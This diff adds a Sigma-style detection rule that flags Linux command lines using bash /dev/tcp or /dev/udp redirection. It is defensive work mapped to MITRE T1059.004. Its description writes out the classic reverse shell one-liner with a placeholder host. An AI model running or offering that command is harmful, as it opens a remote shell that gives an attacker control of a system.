@@ -1,0 +1,27 @@
+title: Reverse shell through bash /dev/tcp redirection
+id: 159ae6cc-72b0-4ed1-83c2-b7ad53a14e29
+status: experimental
+description: >
+  A command line uses bash's /dev/tcp or /dev/udp pseudo-devices, the classic
+  dependency-free reverse shell (bash -i >& /dev/tcp/host/port 0>&1).
+references:
+  - https://attack.mitre.org/techniques/T1059/004/
+author: Jeff Scollick
+date: 2026-11-24
+tags:
+  - attack.execution
+  - attack.command-and-control
+  - attack.t1059.004
+  - attack.t1095
+logsource:
+  product: linux
+  category: process_creation
+detection:
+  selection:
+    process.command_line|contains:
+      - /dev/tcp/
+      - /dev/udp/
+  condition: selection
+falsepositives:
+  - Health-check scripts that probe ports with bash redirection
+level: high
